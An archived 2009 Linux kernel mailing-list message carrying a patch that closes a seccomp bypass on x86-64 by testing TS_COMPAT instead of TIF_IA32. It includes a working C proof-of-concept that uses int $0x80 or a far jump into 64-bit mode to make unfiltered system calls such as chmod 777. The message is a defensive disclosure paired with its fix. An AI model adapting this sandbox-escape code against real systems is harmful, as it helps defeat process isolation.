Return-Path: <linux-kernel-owner+w=401wt.eu-S1752028AbZB1H1P@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1752028AbZB1H1P (ORCPT <rfc822;w@1wt.eu>);
	Sat, 28 Feb 2009 02:27:15 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751491AbZB1H06
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sat, 28 Feb 2009 02:26:58 -0500
Received: from mx1.redhat.com ([66.187.233.31]:45870 "EHLO mx1.redhat.com"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1751445AbZB1H05 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Sat, 28 Feb 2009 02:26:57 -0500
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
From: Roland McGrath <roland@redhat.com>
To: Linus Torvalds <torvalds@linux-foundation.org>
X-Fcc: ~/Mail/linus
Cc: Andrew Morton <akpm@linux-foundation.org>, x86@kernel.org,
       linux-kernel@vger.kernel.org, stable@kernel.org,
       linux-mips@linux-mips.org, sparclinux@vger.kernel.org,
       linuxppc-dev@ozlabs.org
Subject: Re: [PATCH 2/2] x86-64: seccomp: fix 32/64 syscall hole
In-Reply-To: Linus Torvalds's message of  Friday, 27 February 2009 19:52:09 -0800 <alpine.LFD.2.00.0902271948570.3111@localhost.localdomain>
X-Fcc: ~/Mail/linus
References: <20090228030226.C0D34FC3DA@magilla.sf.frob.com>
	<20090228030413.5B915FC3DA@magilla.sf.frob.com>
	<alpine.LFD.2.00.0902271932520.3111@localhost.localdomain>
	<alpine.LFD.2.00.0902271948570.3111@localhost.localdomain>
X-Antipastobozoticataclysm: When George Bush projectile vomits antipasto on the Japanese.
Message-Id: <20090228072554.CFEA6FC3DA@magilla.sf.frob.com>
Date: Fri, 27 Feb 2009 23:25:54 -0800 (PST)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

> Ok, I can see what's going on. And it's disgusting.

That's what I thought when I saw TIF_32BIT in seccomp.

I did the simplest fix I could see touching only x86.

I don't know any other arch well enough to be sure that TIF_32BIT isn't the
wrong test there too.  I'd like to leave that worry to the arch maintainers.

But here is the patch you asked for.

Thanks,
Roland

---
[PATCH] x86-64: seccomp: fix 32/64 syscall hole

On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with
ljmp, and then use the "syscall" instruction to make a 64-bit system
call.  A 64-bit process make a 32-bit system call with int $0x80.

In both these cases under CONFIG_SECCOMP=y, secure_computing() will use
the wrong system call number table.  The fix is simple: test TS_COMPAT
instead of TIF_IA32.  Here is an example exploit:

	/* test case for seccomp circumvention on x86-64

	   There are two failure modes: compile with -m64 or compile with -m32.

	   The -m64 case is the worst one, because it does "chmod 777 ." (could
	   be any chmod call).  The -m32 case demonstrates it was able to do
	   stat(), which can glean information but not harm anything directly.

	   A buggy kernel will let the test do something, print, and exit 1; a
	   fixed kernel will make it exit with SIGKILL before it does anything.
	*/

	#define _GNU_SOURCE
	#include <assert.h>
	#include <inttypes.h>
	#include <stdio.h>
	#include <linux/prctl.h>
	#include <sys/stat.h>
	#include <unistd.h>
	#include <asm/unistd.h>

	int
	main (int argc, char **argv)
	{
	  char buf[100];
	  static const char dot[] = ".";
	  long ret;
	  unsigned st[24];

	  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
	    perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");

	#ifdef __x86_64__
	  assert ((uintptr_t) dot < (1UL << 32));
	  asm ("int $0x80 # %0 <- %1(%2 %3)"
	       : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
	  ret = snprintf (buf, sizeof buf,
			  "result %ld (check mode on .!)\n", ret);
	#elif defined __i386__
	  asm (".code32\n"
	       "pushl %%cs\n"
	       "pushl $2f\n"
	       "ljmpl $0x33, $1f\n"
	       ".code64\n"
	       "1: syscall # %0 <- %1(%2 %3)\n"
	       "lretl\n"
	       ".code32\n"
	       "2:"
	       : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
	  if (ret == 0)
	    ret = snprintf (buf, sizeof buf,
			    "stat . -> st_uid=%u\n", st[7]);
	  else
	    ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
	#else
	# error "not this one"
	#endif

	  write (1, buf, ret);

	  syscall (__NR_exit, 1);
	  return 2;
	}

Signed-off-by: Roland McGrath <roland@redhat.com>
---
 arch/mips/include/asm/seccomp.h    |    1 -
 arch/powerpc/include/asm/compat.h  |    5 +++++
 arch/powerpc/include/asm/seccomp.h |    4 ----
 arch/sparc/include/asm/compat.h    |    5 +++++
 arch/sparc/include/asm/seccomp.h   |    6 ------
 arch/x86/include/asm/seccomp_32.h  |    6 ------
 arch/x86/include/asm/seccomp_64.h  |    8 --------
 kernel/seccomp.c                   |    7 ++++---
 8 files changed, 14 insertions(+), 28 deletions(-)

diff --git a/arch/mips/include/asm/seccomp.h b/arch/mips/include/asm/seccomp.h
index 36ed440..a6772e9 100644
--- a/arch/mips/include/asm/seccomp.h
+++ b/arch/mips/include/asm/seccomp.h
@@ -1,6 +1,5 @@
 #ifndef __ASM_SECCOMP_H
 
-#include <linux/thread_info.h>
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/arch/powerpc/include/asm/compat.h b/arch/powerpc/include/asm/compat.h
index d811a8c..4774c2f 100644
--- a/arch/powerpc/include/asm/compat.h
+++ b/arch/powerpc/include/asm/compat.h
@@ -210,5 +210,10 @@ struct compat_shmid64_ds {
 	compat_ulong_t __unused6;
 };
 
+static inline int is_compat_task(void)
+{
+	return test_thread_flag(TIF_32BIT);
+}
+
 #endif /* __KERNEL__ */
 #endif /* _ASM_POWERPC_COMPAT_H */
diff --git a/arch/powerpc/include/asm/seccomp.h b/arch/powerpc/include/asm/seccomp.h
index 853765e..00c1d91 100644
--- a/arch/powerpc/include/asm/seccomp.h
+++ b/arch/powerpc/include/asm/seccomp.h
@@ -1,10 +1,6 @@
 #ifndef _ASM_POWERPC_SECCOMP_H
 #define _ASM_POWERPC_SECCOMP_H
 
-#ifdef __KERNEL__
-#include <linux/thread_info.h>
-#endif
-
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/arch/sparc/include/asm/compat.h b/arch/sparc/include/asm/compat.h
index f260b58..0e70625 100644
--- a/arch/sparc/include/asm/compat.h
+++ b/arch/sparc/include/asm/compat.h
@@ -240,4 +240,9 @@ struct compat_shmid64_ds {
 	unsigned int	__unused2;
 };
 
+static inline int is_compat_task(void)
+{
+	return test_thread_flag(TIF_32BIT);
+}
+
 #endif /* _ASM_SPARC64_COMPAT_H */
diff --git a/arch/sparc/include/asm/seccomp.h b/arch/sparc/include/asm/seccomp.h
index 7fcd996..adca1bc 100644
--- a/arch/sparc/include/asm/seccomp.h
+++ b/arch/sparc/include/asm/seccomp.h
@@ -1,11 +1,5 @@
 #ifndef _ASM_SECCOMP_H
 
-#include <linux/thread_info.h> /* already defines TIF_32BIT */
-
-#ifndef TIF_32BIT
-#error "unexpected TIF_32BIT on sparc64"
-#endif
-
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/arch/x86/include/asm/seccomp_32.h b/arch/x86/include/asm/seccomp_32.h
index a6ad87b..b811d6f 100644
--- a/arch/x86/include/asm/seccomp_32.h
+++ b/arch/x86/include/asm/seccomp_32.h
@@ -1,12 +1,6 @@
 #ifndef _ASM_X86_SECCOMP_32_H
 #define _ASM_X86_SECCOMP_32_H
 
-#include <linux/thread_info.h>
-
-#ifdef TIF_32BIT
-#error "unexpected TIF_32BIT on i386"
-#endif
-
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/arch/x86/include/asm/seccomp_64.h b/arch/x86/include/asm/seccomp_64.h
index 4171bb7..84ec1bd 100644
--- a/arch/x86/include/asm/seccomp_64.h
+++ b/arch/x86/include/asm/seccomp_64.h
@@ -1,14 +1,6 @@
 #ifndef _ASM_X86_SECCOMP_64_H
 #define _ASM_X86_SECCOMP_64_H
 
-#include <linux/thread_info.h>
-
-#ifdef TIF_32BIT
-#error "unexpected TIF_32BIT on x86_64"
-#else
-#define TIF_32BIT TIF_IA32
-#endif
-
 #include <linux/unistd.h>
 #include <asm/ia32_unistd.h>
 
diff --git a/kernel/seccomp.c b/kernel/seccomp.c
index ad64fcb..57d4b13 100644
--- a/kernel/seccomp.c
+++ b/kernel/seccomp.c
@@ -8,6 +8,7 @@
 
 #include <linux/seccomp.h>
 #include <linux/sched.h>
+#include <linux/compat.h>
 
 /* #define SECCOMP_DEBUG 1 */
 #define NR_SECCOMP_MODES 1
@@ -22,7 +23,7 @@ static int mode1_syscalls[] = {
 	0, /* null terminated */
 };
 
-#ifdef TIF_32BIT
+#ifdef CONFIG_COMPAT
 static int mode1_syscalls_32[] = {
 	__NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
 	0, /* null terminated */
@@ -37,8 +38,8 @@ void __secure_computing(int this_syscall)
 	switch (mode) {
 	case 1:
 		syscall = mode1_syscalls;
-#ifdef TIF_32BIT
-		if (test_thread_flag(TIF_32BIT))
+#ifdef CONFIG_COMPAT
+		if (is_compat_task())
 			syscall = mode1_syscalls_32;
 #endif
 		do {
